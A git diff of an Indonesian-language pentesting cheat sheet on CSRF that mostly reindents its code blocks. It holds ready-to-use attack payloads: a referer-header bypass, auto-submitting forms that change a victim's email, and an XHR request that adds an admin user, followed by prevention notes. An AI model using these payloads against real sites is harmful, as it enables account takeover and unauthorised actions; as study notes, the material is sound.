@@ -23,42 +23,42 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
 - Ketika kita berhasil mengeksploitasi XSS, segala defense mechanisms terhadap CSRF menjadi useless.
 - Bypass referer header
   - Salah satu langkah preventif untuk menanggulangi CSRF adalah memastian referer header berisikan website yang valid. Tapi bagaimana jika fielder header tersebut dihilangkan? kadang kita bisa membypass nya dengan meta tag berikut.
-  ```
-  <meta name="referrer" content="no-referrer" />
-  <iframe src=”data:text/html;base64,form_code_here”>
-  ```
+    ```
+    <meta name="referrer" content="no-referrer" />
+    <iframe src=”data:text/html;base64,form_code_here”>
+    ```
   - Kadang developer juga hanya memastika bahwa referer header mengandung domain mereka, kita bisa mengakalinya dengan menambahkan sebuah direktori dengan domain target pada evil server kita, contoh: `https://www.yoursite.com/https://www.theirsite.com/` atau `https://www.theirsite.computer/`.
-
+- Samesite cookie, bisa dibypass dengan modifikasi GET
 
 ## POC
 
 - Menggunakan HTML Form
-```
-<form method="$method" action="$url">
-  <input type="hidden" name="$param1name" value="$param1value">
-  <input type="submit" value="submit">
+  ```
+  <form method="$method" action="$url">
+    <input type="hidden" name="$param1name" value="$param1value">
+    <input type="submit" value="submit">
+    </form>
+  <script> document.forms[0].submit();</script>
+  ```
+  ```
+  <form action="change.php" method="POST" id="CSRForm">
+    <input name="old" value="myC00lemail@victim.site">
+    <input name="new" value="evil@hacker.site">
+    <img src=x onerror="CSRForm.submit();">
   </form>
-<script> document.forms[0].submit();</script>
-```
-```
-<form action="change.php" method="POST" id="CSRForm">
-  <input name="old" value="myC00lemail@victim.site">
-  <input name="new" value="evil@hacker.site">
-  <img src=x onerror="CSRForm.submit();">
-</form>
-```
+  ```
 - Menggunakan XHR
-```
-<script type="text/javascript">
-  var url =  "http://1.csrf.labs/add_user.php";
-  var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=";    
-  var CSRF = new XMLHttpRequest();
-  CSRF.open("POST", url, true);
-  CSRF.withCredentials = 'true'; //IMPORTANTMUST!!
-  CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-  CSRF.send(params);
-</script> 
-```
+  ```
+  <script type="text/javascript">
+    var url =  "http://1.csrf.labs/add_user.php";
+    var params =  "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&submit=";    
+    var CSRF = new XMLHttpRequest();
+    CSRF.open("POST", url, true);
+    CSRF.withCredentials = 'true'; //IMPORTANTMUST!!
+    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    CSRF.send(params);
+  </script> 
+  ```
 
 ## PREVENTION
 - CSRF Token
@@ -68,17 +68,16 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
   - CSRF token should no be leaked in the server logs or in the URL
 
 - Double submit Cookie
-```
-POST /email/change HTTP/1.1
-Host: vulnerable-website.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 68
-Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+  ```
+  POST /email/change HTTP/1.1
+  Host: vulnerable-website.com
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 68
+  Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
 
-csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com 
-```
+  csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com 
+  ```
 - Samesite Cookie
-  - bisa dibypass dengan modifikasi GET
   ```
   Set-Cookie: JSESSIONID=xxxxx; SameSite=Strict
   Set-Cookie: JSESSIONID=xxxxx; SameSite=Lax
